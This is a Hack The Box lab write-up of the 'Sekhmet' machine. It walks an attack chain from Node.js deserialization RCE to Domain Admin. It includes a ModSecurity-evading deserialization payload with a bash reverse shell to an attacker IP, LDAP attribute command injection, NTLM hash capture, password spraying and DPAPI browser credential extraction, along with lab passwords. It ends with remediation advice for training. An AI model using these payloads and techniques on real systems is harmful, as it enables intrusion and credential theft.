# Sekhmet — Node deserialization to Domain Admin across a Linux pivot

[![Difficulty](https://img.shields.io/badge/difficulty-Insane-red)](https://app.hackthebox.com/machines/Sekhmet)
[![OS](https://img.shields.io/badge/OS-Windows-blue)](https://app.hackthebox.com/machines/Sekhmet)
[![](https://img.shields.io/badge/walkthrough-IppSec-ff0000?logo=youtube&logoColor=white)](https://www.youtube.com/watch?v=vsgPsMZx59w)

> **Attack path:** ExpressJS JSON deserialization (ModSecurity WAF bypass) → shell on Linux web VM → ZipCrypto known-plaintext crack → Kerberos `ksu` root → pivot to DC via SSH SOCKS tunnel → LDAP `mobile` attribute command injection → Net-NTLMv2 crack → password spray → WinRM as Bob.Wood → DPAPI/Edge saved creds → Domain Admin.

## 1 · Reconnaissance

### Port scan

Only two TCP ports are exposed — but note the SSH banner says Debian while HTB labels the box Windows. The target is actually a Linux web VM fronting a Windows DC:

```bash
nmap -p- --min-rate 10000 10.10.11.179
nmap -p 22,80 -sCV 10.10.11.179
# 22/tcp open  ssh  OpenSSH 8.4p1 Debian 5+deb11u1
# 80/tcp open  http nginx 1.18.0
```

### Subdomain enumeration

The site on port 80 redirects to `www.windcorp.htb`. Fuzz vhosts:

```bash
ffuf -u http://10.10.11.179 -H "Host: FUZZ.windcorp.htb" \
  -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -ac -mc all
# => portal
```

```bash
echo "10.10.11.179 www.windcorp.htb windcorp.htb portal.windcorp.htb" >> /etc/hosts
```

`www.windcorp.htb` is a static company site (email `contact@windcorp.htb`). `portal.windcorp.htb` is a login portal; response header `X-Powered-By: Express` fingerprints Node.js/Express.

## 2 · Foothold

### Weak credentials and cookie analysis

The portal accepts default-style credentials `admin` / `admin`. The session is stateless — a base64-encoded JSON cookie:

```bash
echo "eyJ1c2VybmFtZSI6ImFkbWluIiwiYWRtaW4iOiIxIiwibG9nb24iOjE2ODAwMjM5Nzc1NzF9" | base64 -d
# {"username":"admin","admin":"1","logon":1680023977571}
```

That structure is the classic signature of the `node-serialize` library, which is vulnerable to arbitrary code execution when it `unserialize()`s attacker-controlled data (same bug family as HTB Celestial).

### Deserialization RCE

The standard payload uses the `_$$ND_FUNC$$_` marker to make the deserializer evaluate a function:

```json
{"rce":"_$$ND_FUNC$$_function (){
 require('child_process').exec('ping -c 1 10.10.14.6',
function(error, stdout, stderr) { console.log(stdout) });
 }()"}
```

Sending this base64-encoded as the `profile` cookie returns **403 — ModSecurity blocks it**. Binary-search the block by truncation: `{"rce":"_$$ND_FUNC$$_` is blocked, `{"rce":"_$$ND_FUNC$$` is not, so the rule matches the full marker plus what follows (`function (){`, `eval(`, etc.).

### WAF bypass with unicode escapes

ModSecurity's older rule set transforms whitespace/base64 but not unicode escapes. Replace `$` with `\u0024` and `{` with `\u007b`:

```json
{"rce":"_$$ND_FUNC\u0024$_function() \u007brequire('child_process').exec('bash -c \"bash -i >& /dev/tcp/10.10.14.6/443 0>&1\"', function(error,stdout,stderr) {console.log(stdout) });
}()"}
```

Base64-encode it, set it as the `profile` cookie, and a shell arrives as `webster` on the Linux VM (internal IP 192.168.0.100 — the web server is domain-joined via `sssd`, DC is `hope.windcorp.htb` at 192.168.0.2, realm `WINDCORP.HTB`).

```bash
nc -lnvp 443
# webster@webserver:/$
```

## 3 · User flag

### Crack the backup archive (ZipCrypto known-plaintext)

`webster`'s home directory contains `backup.zip`, password-protected with legacy **ZipCrypto** encryption (check with `7z l -slt backup.zip`). `/etc/passwd` is inside the archive, and the current VM has an identical copy — ideal for a known-plaintext attack with `bkcrack`:

```bash
# exfil backup.zip + /etc/passwd to your box, then:
zip plain.zip passwd
bkcrack -C backup.zip -c etc/passwd -P plain.zip -p passwd
# Keys: d6829d8d 8514ff97 afc3f825
bkcrack -C backup.zip -k d6829d8d 8514ff97 afc3f825 -U backup-pass.zip pass
7z x backup-pass.zip   # password: pass
```

### Domain hash from the sssd cache

The archive holds `/var/lib/sss/db/cache_windcorp.htb.ldb`. Dump it with `tdbdump` (or `strings`); the entry for `Ray.Duncan@windcorp.htb` includes a `cachedPassword` SHA512-crypt hash:

```bash
hashcat ray.duncan.hash /usr/share/wordlists/rockyou.txt -m 1800
# ray.duncan : pantera
```

### kinit + ksu

The VM authenticates against AD via Kerberos, and `root` there trusts `ksu`:

```bash
kinit ray.duncan        # password: pantera
ksu                     # authorization successful -> root on webserver
cat /root/user.txt      # <flag>
```

Tip: solidify access by adding your SSH public key to `/root/.ssh/authorized_keys`.

## 4 · Privilege escalation

### Pivot to the DC

Scan the DC from webserver (upload a static nmap): `hope.windcorp.htb` (192.168.0.2) exposes 53, 88 (Kerberos), 389/636 (LDAP), 445 (SMB), 5985 (WinRM) — a standard DC. Tunnel with SSH dynamic port forwarding:

```bash
ssh -i key root@10.10.11.179 -D 1080
# configure /etc/krb5.conf with realm WINDCORP.HTB, kdc = hope.windcorp.htb (case matters)
proxychains kinit ray.duncan
```

### SMB enumeration

```bash
proxychains smbclient -k -L //hope.windcorp.htb
# WC-Share -> temp/debug-users.txt (four "name + phone" entries)
# NETLOGON -> form.ps1, "Update phone.lnk"
```

`form.ps1` writes to the LDAP `mobile` attribute — and `debug-users.txt` is regenerated every two minutes from that attribute.

### Command injection via the mobile attribute

Write your own `mobile` value with `ldapmodify` from webserver:

```bash
echo -e 'dn: CN=RAY DUNCAN,OU=DEVELOPMENT,DC=WINDCORP,DC=HTB\nchangetype: modify\nreplace: mobile\nmobile: $(whoami)' \
  | ldapmodify -H ldap://hope.windcorp.htb
```

Two minutes later `debug-users.txt` shows `RayDuncanwindcorp\scriptrunner` — the ingestion script interpolates the attribute into a command. Classic blind command injection, but output only lands in the SMB file (monitor it with `watch`).

### Capture a Net-NTLMv2 hash

Direct callbacks (nc64.exe) fail — AppLocker blocks unsigned binaries for `scriptrunner`. Instead make the DC authenticate to a share you control. Relay it through the webserver with remote port forwarding (`GatewayPorts yes` in webserver's `sshd_config`):

```bash
ssh -i key root@10.10.11.179 -D 1080 -R 0.0.0.0:445:127.0.0.1:445
smbserver.py df . -smb2support
```

Set `mobile` to `$(net use \\webserver.windcorp.htb\df 2>&1)` — `smbserver.py` receives a Net-NTLMv2 challenge/response for `WINDCORP\scriptrunner`. Crack it:

```bash
hashcat scriptrunner.netntlmv2 /usr/share/wordlists/rockyou.txt -m 5600
# scriptrunner : !@p%i&J#iNNo1T2
```

### Password spray to Bob.Wood

Service accounts often share passwords with humans. Pull ~600 usernames via `ldapsearch`, then spray with `kerbrute` from webserver:

```bash
./kerbrute passwordspray -d windcorp.htb domainusers '!@p%i&J#iNNo1T2'
# [+] VALID LOGIN: Bob.Wood@windcorp.htb
```

Bob.Wood is in the `IT` / `Adminusers` groups and can WinRM:

```bash
proxychains kinit bob.wood
proxychains evil-winrm -i hope.windcorp.htb -r windcorp.htb
```

### DPAPI secrets in Edge (with an AppLocker twist)

Mimikatz uploads are blocked by AppLocker and PowerShell is in constrained language mode. Two working paths:

- **Offline:** exfil Edge's `Login Data` (SQLite) and `Local State` (JSON) via `certutil -encode`, then recover the DPAPI masterkey chain with `pypykatz`:

```bash
pypykatz dpapi prekey password 'S-1-5-21-...-2761' '!@p%i&J#iNNo1T2' | tee pkf
pypykatz dpapi masterkey a8bd1009-f2ac-43ca-9266-8e029f503e11 pkf -o mkf
pypykatz dpapi chrome --logindata logindata mkf localstate
```

- **On-box:** read the effective policy with `Get-AppLockerPolicy -effective -xml`, compare blocked paths against world-writable directories, and find `C:\windows\debug\wia` is both writable and allowed. Drop `SharpChromium.exe` there and run `.\scium.exe logins`.

Both reveal a saved login for `bob.woodADM@windcorp.com` with password `smeT-Worg-wer-m024`.

## 5 · Root flag / Domain Admin

`bob.woodADM` is Bob's administrative account:

```bash
proxychains kinit bob.woodadm      # password: smeT-Worg-wer-m024
proxychains evil-winrm -i hope.windcorp.htb -r windcorp.htb
whoami /groups                      # WINDCORP\Domain Admins
type C:\Users\administrator\desktop\root.txt   # <flag>
```

## 6 · Impact & remediation

| Risk | Impact | Remediation |
| --- | --- | --- |
| Insecure deserialization in Express app (`node-serialize`) | Unauthenticated RCE as the web service user | Never pass user-controlled data to `unserialize()`; use signed, non-executable session formats (e.g. JWT) |
| Default credentials (`admin`/`admin`) on the portal | Trivial initial access and session cookie theft | Enforce strong, unique passwords and MFA on admin accounts |
| Legacy ZipCrypto-encrypted backup storing AD cache data | Offline recovery of a domain user's password hash | Use AES-256 zip encryption; never back up `sssd` caches with reusable credentials to a web host |
| Unsanitized script consuming the LDAP `mobile` attribute | Command execution as `scriptrunner`, Net-NTLMv2 leakage | Treat directory attributes as untrusted input; run integration scripts with least privilege and no network-auth capabilities |
| Password reuse between service and human accounts | One cracked password becomes domain login via spray | Unique passwords for service accounts; spray-resistant smart lockouts; separate privileged (ADM) accounts with distinct credentials |

## 7 · CPTS takeaways

- The cookie-shaped-like-a-JavaScript-object pattern (`{"username":...}` base64) should immediately trigger deserialization testing in Node apps — IppSec shows the exact `_$$ND_FUNC$$_` payload.
- WAF bypass is exam-relevant: when a payload is blocked, binary-search the signature and try encoding tricks (unicode escapes, charcode arrays) rather than abandoning the bug.
- Kerberos from Linux (`kinit`, `ksu`, `klist`, `smbclient -k`, `ldapmodify`/`ldapsearch` with GSS-SPNEGO) is a core CPTS skill — especially combined with SOCKS pivots via `ssh -D` and `proxychains`.
- Net-NTLMv2 capture plus `kerbrute passwordspray` models a realistic enterprise weakness: shared passwords between service and user accounts.
- DPAPI/browser credential hunting (pypykatz, SharpChromium) and AppLocker policy enumeration (`Get-AppLockerPolicy -effective`) round out the Windows post-exploitation toolkit the exam expects you to run under constrained language mode.
